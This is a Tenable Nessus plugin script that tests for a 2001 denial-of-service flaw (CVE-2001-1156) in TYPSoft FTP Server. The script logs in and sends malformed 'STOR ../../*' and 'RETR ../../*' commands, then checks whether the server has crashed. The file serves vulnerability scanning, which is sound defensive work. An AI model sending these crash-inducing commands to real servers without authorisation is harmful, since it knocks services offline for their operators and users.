#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: domain no longer exists)
#      Added BugtraqID and CAN
#
# References:
# Date:  Mon, 08 Oct 2001 14:05:00 +0200
# From: "J. Wagner" <jan.wagner@de.tiscali.com>
# To: bugtraq@securityfocus.com
# CC: "typsoft" <typsoft@altern.org>
# Subject: [ASGUARD-LABS] TYPSoft FTP Server v0.95 STOR/RETR \
#  Denial of Service Vulnerability 
#


include("compat.inc");

if(description)
{
 script_id(11097);
 script_bugtraq_id(3409);
 script_osvdb_id(2085);
 script_version ("$Revision: 1.24 $");
 script_cve_id("CVE-2001-1156");
 
 script_name(english:"TYPSoft FTP Server Malformed STOR / RETR Command DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote FTP server crashes when it is sent the command
	RETR ../../*
or
	STOR ../../*

An attacker may use this flaw to cause the server to crash." );
 script_set_attribute(attribute:"solution", value:
"Upgrade the software or use another FTP service." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value:"2002/08/21");
 script_cvs_date("$Date: 2011/08/16 20:50:08 $");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/10/08");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 
 summary["english"] = "Crashes the remote TypSoft FTP server";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2002-2011 Tenable Network Security, Inc.");
 script_family(english:"FTP");
 script_dependencie("ftpserver_detect_type_nd_version.nasl", "ftp_anonymous.nasl");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#

include("global_settings.inc");
include("misc_func.inc");
include("ftp_func.inc");

cmd[0] = "STOR";
cmd[1] = "RETR";

port = get_ftp_port(default: 21);

login = get_kb_item("ftp/login");
pass  = get_kb_item("ftp/password");
if (!login) login = "ftp"; 
if (!pass) pass = "test@nessus.com";

soc = open_sock_tcp(port);
if(! soc) exit(1, "TCP connection to port "+port+" failed.");

if (!ftp_authenticate(socket:soc, user:login, pass:pass))
 exit(0, "Cannot authenticate on FTP server on port "+port+"." );

#if(!r)exit(0);
for (i=0; i<2;i=i+1)
{
 send(socket:soc, data:string(cmd[i], " ../../*\r\n"));
 r = recv_line(socket:soc, length:20000);
 }
ftp_close(socket: soc);

if (service_is_dead(port: port) > 0)
  security_warning(port);
else
  exit(0, "The FTP server on port "+port+" is still alive.");
